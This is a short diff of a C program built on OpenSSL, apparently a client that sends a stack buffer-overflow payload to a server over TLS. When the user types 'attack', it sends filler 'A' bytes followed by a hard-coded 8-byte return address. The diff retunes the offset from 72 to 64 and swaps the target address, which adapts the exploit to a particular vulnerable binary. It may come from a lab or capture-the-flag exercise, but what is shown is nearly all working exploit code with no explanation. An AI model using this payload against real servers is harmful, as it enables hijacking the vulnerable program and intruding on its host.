@@ -6,8 +6,8 @@
 #include <openssl/ssl.h>
 #include <openssl/err.h>
 
-#define PORT 12346
-#define BUFFER_SIZE 1024
+#define PORT 12345
+#define BUFFER_SIZE 2048
 
 void init_openssl() {
     SSL_library_init();
@@ -94,11 +94,11 @@ int main() {
             while (1) {
                 fgets(command,BUFFER_SIZE,stdin);
                 command[strcspn (command,"\n") ] = '\0'; 
-
+                int x=64; 
                 char payload[BUFFER_SIZE];
                 if (strcmp(command, "attack") == 0) {
-                    memset(payload, 'A', 72); 
-                    memcpy(payload + 72, "\x5c\x14\x55\x55\x55\x00\x00\x00", 8); 
+                    memset(payload, 'A', x);
+                    memcpy(payload + x, "\x48\x15\x55\x55\x55\x00\x00\x00", 8);   
                     SSL_write(ssl, payload, sizeof(payload));
                 } else {
                     SSL_write(ssl, command, strlen(command)); 
